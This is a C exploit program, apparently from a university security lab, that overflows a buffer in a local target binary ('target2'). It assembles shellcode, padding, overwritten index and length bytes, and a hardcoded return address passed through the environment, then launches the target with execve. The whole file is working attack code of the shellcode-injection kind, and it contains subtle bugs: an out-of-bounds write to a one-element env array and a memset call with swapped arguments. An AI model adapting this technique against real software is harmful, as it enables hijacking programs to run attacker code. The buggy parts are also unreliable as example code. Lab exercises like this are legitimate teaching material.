#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target2"


int
main ( int argc, char * argv[] )
{
    char *args[3];
    char *env[1];

    char hk_string[272];
    memset(hk_string, '\x00', 272);    
    int i = 0;
    strcat(hk_string,shellcode); 
    for(i=45;i<268;i++)
    {
        hk_string[i]='\x3';
    }

    //i
    hk_string[264] = '\x0b'; 
  	
  	//len
    hk_string[268] = '\x1c';
    hk_string[269] = '\x01';
    hk_string[270] = '\x00';
    hk_string[271] = '\x00';  

    args[0] = TARGET;
    args[1] = hk_string;
    args[2] = NULL;

    env[0] = "";//&hack[270]; 
    env[1] = (char*)malloc(sizeof(char)*13);
    memset(env[1], 8, 0x90);

    //return address
    env[1][8] = '\x40';
    env[1][9] = '\xfd';
    env[1][10] = '\x21';
    env[1][11] = '\x20';
    env[1][12] = '\x00';

  
    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}